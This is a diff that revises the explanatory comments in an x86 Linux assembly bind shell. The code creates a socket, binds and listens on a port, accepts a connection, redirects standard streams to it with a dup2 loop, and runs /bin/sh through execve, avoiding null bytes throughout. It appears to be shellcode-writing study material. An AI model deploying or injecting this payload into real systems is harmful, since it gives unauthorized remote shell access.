@@ -19,13 +19,13 @@ _start:
 	; arguments are PF_INET = AF_INET (2), SOCK_STREAM (1), IPPROTO_IP(0) in reverse order  
 	; we use bl register instead of ebx because "mov ebx,0x1" contains null bytes, for example b8 66 00 00 00 mov eax,0x66
 	mov    bl,0x1
-	; the two next operands simply replace "push 0x0" which contains a null byte 
+	; the two next operands simply replace "push 0x0" which contains a null byte, we will usually use xor x,x and push x to push 0  
 	xor eax,eax
 	push eax 
-	; 
+	; arguments 
 	push   0x1
 	push   0x2
-	; we create a structure by sending a pointer to this struct, the struct lives on the stack, this is why we pushed previous values onto the stack, to create this struct    
+	; we create a structure by sending a pointer to this struct as argument, the struct lives on the stack, this is why we pushed previous values onto the stack, to create this struct    
 	mov    ecx,esp
 	; syscall "socket" is number 112, 0x66 in hex 
 	mov    al,0x66
@@ -35,7 +35,7 @@ _start:
 
 	; syscall "socket", with bind argument provided, 0x2 in ebx  
 	mov    bl,0x2
-	; replace push 0x0 with xor esi and push esi, an unused register  
+	; push 0x0 
 	xor    esi,esi
 	push   esi
 	push word  PORT 
@@ -48,8 +48,8 @@ _start:
 	mov    al,0x66
 	int    0x80
 
-	; syscall "socket", with argument listen 
-	; replaced push 0x0 with xor esi push esi 
+	; syscall "socket", with argument listen, 0x4 in ebx  
+	; push 0x0 
 	xor esi,esi
 	push   esi
 	push   edi
@@ -58,10 +58,10 @@ _start:
 	mov    bl,0x4
 	int    0x80
 
-	; syscall "socket", with argument accept 
+	; syscall "socket", with argument accept, 0x5 in ebx  
 	mov    al,0x66
 	mov    bl,0x5
-	; push 0x0 two times for aguments 
+	; push 0x0 two times for aguments to accept 
 	xor esi,esi
 	push   esi
 	push   esi
@@ -71,7 +71,8 @@ _start:
 
 	; duplicating fd from socket to stdin stdout stderr of the process 
 	mov    ebx,eax
-	; we need to clean ecx if we use cl to avoid null byte  
+	; we need to clean ecx, at this state it contains data such as "0xBFFFF39C"
+	; since we use "mov cl" and not mov ecx (to avoid null byte) we dont want to have this remaining data and break the loop 
 	xor ecx,ecx
 	mov    cl,0x2
 	; we use a loop for iterating cl, ie from 2 , 1 to 0 
@@ -81,17 +82,17 @@ _start:
 	int    0x80
 	dec    ecx
 	; sign flag is not set if ecx is not inferior to 0 
-	; we use jump if not sign 
+	; so we use jump if not sign which check the flag  
 	jns    loop 
 
-	; syscall "execve" with arguments /bin/sh null terminated and a null string for envp argument  
+	; syscall "execve", with arguments /bin/sh null terminated and a null string for envp argument  
 	mov    al,0xb
 	xor esi,esi
 	push   esi 
-	push   0x68732f2f
-	push   0x6e69622f
+	push   0x68732f2f ; 
+	push   0x6e69622f ; 
 	mov    ebx,esp
-	; 
+	; push null termination 
 	xor esi,esi
 	push   esi 
 	mov    edx,esp
